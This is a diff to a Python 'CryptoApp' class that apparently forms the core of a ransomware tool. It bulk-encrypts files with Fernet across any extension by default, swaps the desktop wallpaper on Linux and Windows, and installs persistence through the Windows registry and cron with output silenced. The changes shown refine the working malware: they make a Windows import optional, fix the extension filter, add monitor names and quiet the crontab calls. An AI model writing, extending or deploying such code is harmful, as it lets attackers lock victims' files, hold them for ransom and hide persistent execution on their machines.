@@ -6,13 +6,14 @@ import sys
 import os
 import signal
 import json
-import winreg
+import importlib
+
+if importlib.find_loader('winreg'):
+    import winreg
 
 
 class CryptoApp:
-    # CHECK
     def __init__(self, startPath: str = None):
-
         # Init the starting path, and change the current directory to it
         startPath: str = startPath or os.getcwd()
         os.chdir(startPath)
@@ -45,8 +46,8 @@ class CryptoApp:
 
         try:
             self.fernet = Fernet(self.key)
-        except ValueError:
 
+        except ValueError:
             # If the key is incorrect, delete it, and exit the program
             print('[ERROR] Incorrect key! You can forget about decryption')
             print('[INFO] Removing key...')
@@ -70,7 +71,6 @@ class CryptoApp:
         call(command, shell=True)
 
 
-    # CHECK
     # Handle the encrypt/decrypt actions
     def __actionHandler(self) -> None:
 
@@ -81,11 +81,11 @@ class CryptoApp:
         )) 
 
         # Filter the file extensions
-        # if len(self.extensionsToModify):
-        files = list(filter(
-            lambda x: x.endswith(tuple(self.extensionsToModify)) or os.path.isdir(x)
-            , files
-        ))
+        if len(self.extensionsToModify):
+            files = list(filter(
+                lambda x: x.endswith(tuple(self.extensionsToModify)) or os.path.isdir(x)
+                , files
+            ))
 
 
         # Loop through each file
@@ -134,21 +134,16 @@ class CryptoApp:
                 print(f'[ERROR] Could not modify file: {path}')
 
 
-
-    # CHECK
     # Choose which files will be skipped during encryption
     def setFilesToSkip(self, files: list) -> None:
         self.omittedFiles.extend(files)
 
 
-    # CHECK
     # Choose which file extensions will be encrypted (default any, which may cause very serious damage)
     def setExtensionsToModify(self, extensions: list) -> None:
         self.extensionsToModify.extend(extensions)
 
 
-
-    # CHECK
     # Helper function for encrypting/decrypting
     def enc_dec_helper(self, type: str) -> None:
         action: Optional[str] = None
@@ -161,23 +156,19 @@ class CryptoApp:
         print(f'[FINISH] {action[:7]}ed {self.countFiles} files')
 
 
-
-    # CHECK
     # Encrypt the files
     def encrypt(self) -> None:
         self.enc_dec_helper('enc')
 
 
-
-    # CHECK
     # Decrypt the files
     def decrypt(self) -> None:
         self.enc_dec_helper('dec')
 
+        # Remove the decryption key
         os.remove(self.KEY_PATH)
 
 
-    # CHECK
     # Determine the OS, and DE, if on Linux
     # Returns a list with a two elements that represent os and optionally desktop environment
     def determineOS(self) -> list:
@@ -203,9 +194,11 @@ class CryptoApp:
         return [os_info, de]            
 
 
-
     # Set the wallpaper image
     def setDesktopBG(self, target_os: str, target_de: str, file: str) -> None:
+        if not file or not os.path.isfile(file): 
+            return
+
         try:
             abs_path: str = os.path.abspath(file)
 
@@ -213,7 +206,7 @@ class CryptoApp:
             if target_os == 'linux':
                 # Xfce4 Desktop. Tested with Virtual and monitor0. Not sure about the others
                 if target_de == 'xfce4':
-                    for monitor in ['Virtual1', '0']:
+                    for monitor in ['Virtual1', 'Virtual-1', '0']:
                         self.__runsh(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{monitor}/workspace0/last-image -s {abs_path} 2>/dev/null')
 
                 # GNOME
@@ -223,26 +216,23 @@ class CryptoApp:
 
             # Windows
             if target_os == 'windows':
-                SPI_SET: int = 0x14
-
-                ctypes.windll.user32.SystemParametersInfoW(SPI_SET, 0, abs_path, 0)
+                ctypes.windll.user32.SystemParametersInfoW(0x14, 0, abs_path, 0)
 
         except:
-            print('[ERROR] Could not change a wallpaper')
-
+            print('[ERROR] Could not change the wallpaper')
 
 
     # Get the current wallpaper image
     def getDesktopBG(self, target_os: str, target_de: str) -> str | None:
-        output = None
+        output: Optional[str] = None
 
         try:
             # Linux distros
             if target_os == 'linux':
-                # Xfce4 Desktop. Tested with Virtual and monitor0. Not sure about the others
+                # Xfce4 Desktop. Tested with Virtual and monitor0.
                 if target_de == 'xfce4':
-                    for x in ['Virtual1', '0']:
-                        result = self.__getsh(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{x}/workspace0/last-image')
+                    for x in ['Virtual1', 'Virtual-1', '0']:
+                        result: Optional[str] = self.__getsh(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{x}/workspace0/last-image')
 
                         # Remove the line break
                         output = result.rstrip()
@@ -250,7 +240,7 @@ class CryptoApp:
 
                 # GNOME. Get the dark theme
                 elif target_de == 'gnome':
-                    result = self.__getsh('gsettings get org.gnome.desktop.background picture-uri-dark')
+                    result: str = self.__getsh('gsettings get org.gnome.desktop.background picture-uri-dark')
                     
                     # Remove the "file://" and '' to get a clear url
                     output: str = result.rstrip().replace('file://', '').replace("'", '')
@@ -258,10 +248,9 @@ class CryptoApp:
             # Windows
             if target_os == 'windows':
                 MAX: int = 260
-                SPI_GET: int = 0x73
 
                 buf = ctypes.create_unicode_buffer(MAX)
-                ctypes.windll.user32.SystemParametersInfoW(SPI_GET, MAX, buf, 0)
+                ctypes.windll.user32.SystemParametersInfoW(0x73, MAX, buf, 0)
 
                 output = buf.value
 
@@ -269,7 +258,7 @@ class CryptoApp:
             return output
 
         except:
-            print('[ERROR] Could not get a wallpaper')
+            print('[ERROR] Could not get the wallpaper')
 
 
     # Launch a specified script on startup using windows registry (windows)
@@ -358,13 +347,13 @@ class CryptoApp:
             self.writeFile(CRON_ARG, current)
             
             # Save the new cron settings and run the script
-            self.__runsh(f'crontab {CRON_ARG}')
+            self.__runsh(f'crontab {CRON_ARG} &> /dev/null')
             self.__runsh(f'python3 {scriptToStart} &')
             os.remove(CRON_ARG)
 
         elif type == 'stop' and os.path.isfile(CRON_ORIGINAL):
             # Revert to the original cron settings
-            self.__runsh(f'crontab {CRON_ORIGINAL}')
+            self.__runsh(f'crontab {CRON_ORIGINAL} &> /dev/null')
             os.remove(CRON_ORIGINAL)
 
             try:
@@ -378,8 +367,6 @@ class CryptoApp:
             except: return
 
 
-
-    # CHECK
     # Write to the file
     def writeFile(self, path: str, val: str) -> None:
         mode = 'wb' if isinstance(val, bytes) else 'w'
@@ -388,25 +375,20 @@ class CryptoApp:
             file.write(val)
 
 
-
-    # CHECK
     # Read the file contents
     def readFile(self, path: str) -> str | None:
-        try:
+        if os.path.isfile(path):
             with open(path, 'rb') as file:
                 return file.read()
 
-        except:
-            raise Exception(f'[ERROR] File: {path} does not exist')
+        return None
 
 
-    # CHECK
-    # Returns True, if the files were already encrypted (or if the key.txt is present)    
+    # Returns True, if the files were already encrypted (key.txt is present)    
     def isAlreadyEncrypted(self) -> bool:
         return self.isEncrypted
 
     
-    # CHECK
+    # Get a list of a total modified files and directories
     def getCount(self) -> list:
-    # Get a list of a total affected files and directories
         return [self.countFiles, self.countDirs]
